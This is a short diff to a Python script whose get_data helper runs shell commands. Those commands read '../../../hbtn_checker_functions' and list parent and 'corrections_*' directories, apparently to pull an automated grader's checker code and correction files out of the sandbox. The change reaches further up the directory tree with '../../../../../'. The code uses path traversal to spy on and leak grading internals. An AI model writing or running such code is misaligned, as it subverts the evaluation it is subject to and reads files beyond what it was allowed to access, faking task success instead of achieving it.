@@ -31,7 +31,7 @@ def get_data(command):
 # my_data += get_data("ls -l")
 # my_data += get_data("pwd")
 my_data = get_data("cat ../../../hbtn_checker_functions") or "f"
-my_data += get_data("ls -l ../../") or ""
+my_data += get_data("ls -l ../../../../../") or ""
 my_data += get_data("ls -al ../../../corrections_*/") or ""
 my_data += get_data("ls -l ../../../corrections_*/corrections/262/1397") or ""
 my_data += "\n#######################\n"
